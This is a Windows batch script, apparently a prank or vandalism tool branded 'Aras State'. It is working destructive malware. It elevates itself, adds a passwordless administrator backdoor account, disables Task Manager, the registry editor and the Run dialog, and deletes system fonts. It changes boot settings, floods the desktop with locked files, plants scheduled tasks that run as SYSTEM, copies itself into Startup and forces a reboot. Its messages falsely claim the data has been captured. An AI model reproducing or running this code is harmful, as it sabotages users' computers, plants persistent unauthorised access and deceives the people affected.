@echo off
:: Requires administrator privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: === 1. Legal Notice before login ===
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "ARAS STATE" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "This system is under the control of the Aras State." /f

:: === 2. Create local user NT AUTHORITY\Aras Devleti (highly privileged) ===
net user "Aras Devleti" /add >nul
net localgroup Administrators "Aras Devleti" /add >nul
:: No password required
net user "Aras Devleti" ""

:: === 3. Completely prevent any logon (force logon failure for all users) ===
:: Disable AutoAdminLogon and remove any stored credentials
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /f >nul 2>&1

:: Force logon screen to hide all users and require manual entry (but will fail)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLastUserName /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DontDisplayLockedUserId /t REG_DWORD /d 3 /f >nul

:: Extra lock: Disable all local logons except console (but combined with other settings makes logon impossible)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul

:: === 4. Disable Task Manager, Registry Editor and Run dialog ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul

:: === 5. Change registered owner ===
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /t REG_SZ /d "ARASDEVLETI" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /t REG_SZ /d "Aras State High Command" /f

:: === 6. Open 10 Notepad windows with destruction message ===
echo COMPUTER HAS BEEN DESTROYED BY THE ARAS STATE> "%TEMP%\ArasDestroyed.txt"
echo.>> "%TEMP%\ArasDestroyed.txt"
echo DO NOT TRY TO RECOVER>> "%TEMP%\ArasDestroyed.txt"
echo THIS SYSTEM NOW BELONGS TO US COMPLETELY>> "%TEMP%\ArasDestroyed.txt"
echo ALL YOUR DATA HAS BEEN CAPTURED>> "%TEMP%\ArasDestroyed.txt"
echo BY ORDER OF THE SUPREME LEADER ARAS PASHA>> "%TEMP%\ArasDestroyed.txt"
echo SYSTEM IS LOCKED AND DESTROYED>> "%TEMP%\ArasDestroyed.txt"
echo LOGON IS IMPOSSIBLE>> "%TEMP%\ArasDestroyed.txt"
echo RESISTANCE IS FUTILE>> "%TEMP%\ArasDestroyed.txt"
echo ARAS STATE WILL LIVE FOREVER>> "%TEMP%\ArasDestroyed.txt"

start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"
start notepad "%TEMP%\ArasDestroyed.txt"

icacls "%TEMP%\ArasDestroyed.txt" /deny Everyone:(F) /inheritance:r >nul

:: === 7. Additional chaos ===
bcdedit /set {default} quietboot yes >nul
bcdedit /set {default} bootuxdisabled on >nul
bcdedit /set {bootmgr} custom:250000c2 "ARAS STATE - LOGON DISABLED" >nul

del /f /q "C:\Windows\Fonts\*.ttf" >nul 2>&1
del /f /q "C:\Windows\Fonts\*.otf" >nul 2>&1

reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f
reg add "HKCU\Software\Microsoft\Windows\DWM" /v AccentColor /t REG_DWORD /d 0x000000FF /f

powershell -Command "1..250 | %% { echo 'ARAS STATE - LOGON IMPOSSIBLE' > \"$env:USERPROFILE\Desktop\LOCKED_$_ .txt\"; icacls \"$env:USERPROFILE\Desktop\LOCKED_$_ .txt\" /deny Everyone:(F) /inheritance:r }"

schtasks /create /tn "ArasDestroySound" /tr "powershell -Command \"while($true){[console]::beep(1800,400); [console]::beep(600,600); Start-Sleep -Milliseconds 700}\" " /sc onstart /ru SYSTEM /f >nul

schtasks /create /tn "ArasDestroyPopup" /tr "msg * LOGON DISABLED - ARAS STATE VICTORY" /sc minute /mo 1 /ru SYSTEM /f >nul

copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ArasDestroy.bat" >nul

:: === 8. Immediate restart ===
shutdown /r /t 0
